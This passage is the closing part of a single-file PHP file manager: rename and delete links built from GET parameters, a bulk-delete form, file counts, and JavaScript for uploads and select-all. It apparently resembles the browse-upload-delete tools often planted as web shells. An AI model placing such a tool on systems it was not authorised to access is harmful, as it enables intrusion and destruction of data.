    <a href='?path=".urlencode($path)."&rename=".urlencode($item['name'])."&sort=".urlencode($sort)."' class='flex items-center justify-center space-x-1 px-3 py-2 text-xs bg-yellow-600 hover:bg-yellow-700 rounded-lg transition-colors duration-200'>
    <i class='fas fa-pen'></i>
    <span>Rename</span>
    </a>
    </div>
    <div class='mt-2'>
    <a href='?path=".urlencode($path)."&del=".urlencode($item['name'])."&sort=".urlencode($sort)."' onclick='return confirm(\"Delete this file?\")' class='flex items-center justify-center space-x-1 px-3 py-2 text-xs bg-red-600 hover:bg-red-700 rounded-lg transition-colors duration-200 w-full'>
    <i class='fas fa-trash'></i>
    <span>Delete</span>
    </a>
    </div>
    </div>";
}

echo "
</div>
<div class='p-4 bg-gray-700 border-t border-gray-600'>
    <button type='submit' name='bulk_delete' onclick='return confirm(\"Delete selected items?\")' class='px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 focus:ring-offset-gray-800'>
        <i class='fas fa-trash mr-2'></i>Delete Selected
    </button>
</div>
</div>
</form>

<!-- Footer Stats -->
<div class='mt-8 bg-gray-800 rounded-xl p-4 border border-gray-700'>
<div class='flex items-center justify-between text-sm text-gray-400'>
<div class='flex items-center space-x-4'>
<span class='flex items-center space-x-2'>
<i class='fas fa-folder text-blue-400'></i>
<span>".count($dirs)." folders</span>
</span>
<span class='flex items-center space-x-2'>
<i class='fas fa-file text-gray-400'></i>
<span>".count($files)." files</span>
</span>
</div>
<div class='flex items-center space-x-2'>
<div class='w-2 h-2 bg-green-400 rounded-full animate-pulse'></div>
<span>Ready</span>
</div>
</div>
</div>

</div>

<script>
// Add smooth scrolling and enhanced interactions
document.addEventListener('DOMContentLoaded', function() {
    // Smooth hover effects for file rows
    const fileRows = document.querySelectorAll('[class*=\"hover:bg-gray-750\"]');
    fileRows.forEach(row => {
        row.addEventListener('mouseenter', function() {
            this.style.transform = 'translateX(4px)';
        });
        row.addEventListener('mouseleave', function() {
            this.style.transform = 'translateX(0)';
        });
    });
    
    // Enhanced file upload feedback
    const fileInputs = document.querySelectorAll('input[type=\"file\"]');
    fileInputs.forEach(input => {
        input.addEventListener('change', function() {
            if(this.files.length > 0) {
                const submitBtn = this.closest('form').querySelector('button[type=\"submit\"]');
                submitBtn.innerHTML = '<i class=\"fas fa-spinner fa-spin mr-2\"></i>Uploading...';
                submitBtn.disabled = true;
                this.closest('form').submit();
            }
        });
    });

    // Select all checkbox functionality
    const selectAll = document.getElementById('selectAll');
    const checkboxes = document.querySelectorAll('input[name=\"selected_items[]\"]');
    selectAll.addEventListener('change', function() {
        checkboxes.forEach(cb => cb.checked = this.checked);
    });

    // Update select all state based on individual checkboxes
    checkboxes.forEach(cb => {
        cb.addEventListener('change', function() {
            selectAll.checked = Array.from(checkboxes).every(cb => cb.checked);
        });
    });
});
</script>

</body></html>";
?>
